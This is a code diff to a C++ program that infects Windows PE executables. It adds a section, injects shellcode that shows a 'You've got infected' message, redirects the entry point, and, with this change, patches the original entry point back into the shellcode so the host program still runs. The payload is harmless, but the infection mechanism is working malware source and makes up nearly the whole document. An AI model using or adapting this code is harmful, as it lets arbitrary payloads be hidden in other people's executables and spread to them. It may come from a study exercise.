@@ -24,7 +24,7 @@ BYTE shellcode[] = {
     "\x59\x6f\x75\x27\x8b\xcc\x57\x57\x51\x57"
     "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
     "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
-    "\x69\x74\x54\x53\xff\xd6\x68\xa0\x99\x44"
+    "\x69\x74\x54\x53\xff\xd6\x68\x00\x00\x00"
     "\x00\xc3" 
 // This shellcode will pops up "You've got infected" message
 // After the user clicks OK button, it jumps back to the OriginalEntryPoint (which at 0x4499A0)
@@ -66,6 +66,7 @@ bool readAndInjectShellcode(const std::wstring& filePath) {
 	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)(fileBuffer);
 	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
 	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
+	DWORD imageBase = ntHeader->OptionalHeader.ImageBase;
 	DWORD ret = SetFilePointer(fileHandle, dosHeader->e_lfanew, NULL, FILE_BEGIN);
 	DWORD newCharacteristics;
 	DWORD offsetToDllCharacteristics = ret + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32, DllCharacteristics);
@@ -80,7 +81,7 @@ bool readAndInjectShellcode(const std::wstring& filePath) {
 		DWORD sectionAlignment = ntHeader->OptionalHeader.SectionAlignment;
 		DWORD sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
 		DWORD newSectionVirtualAddress = lastSection.VirtualAddress + (lastSection.Misc.VirtualSize + (sectionAlignment - 1) & ~(sectionAlignment - 1));
-		size_t codeSize = sizeof(shellcode);
+		size_t codeSize = sizeof(shellcode) - 1;
 
 		// Create new section
 		IMAGE_SECTION_HEADER newSection = {};
@@ -104,6 +105,11 @@ bool readAndInjectShellcode(const std::wstring& filePath) {
 		// Inject the shellcode
 		SetFilePointer(fileHandle, newSection.PointerToRawData, NULL, FILE_BEGIN);
 		WriteFile(fileHandle, shellcode, codeSize, NULL, NULL);
+
+		// Calculate the original Entrypoint to jump back and writes to the shellcode
+		DWORD orgEntryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint + imageBase;
+		SetFilePointer(fileHandle, newSection.PointerToRawData + codeSize - 5, NULL, FILE_BEGIN);
+		WriteFile(fileHandle, &orgEntryPoint, sizeof(DWORD), NULL, NULL);
 
 		// Turn off DLL can move flag
 		SetFilePointer(fileHandle, offsetToDllCharacteristics, NULL, FILE_BEGIN);
@@ -131,7 +137,6 @@ bool readAndInjectShellcode(const std::wstring& filePath) {
 		ntHeader->OptionalHeader.AddressOfEntryPoint = newSectionVirtualAddress;
 		SetFilePointer(fileHandle, ret + 40, NULL, FILE_BEGIN);
 		WriteFile(fileHandle, &newSectionVirtualAddress, sizeof(DWORD), NULL, NULL);
-
 	}
 	else {
 		printErrorMessage("Failed to read PE Header");
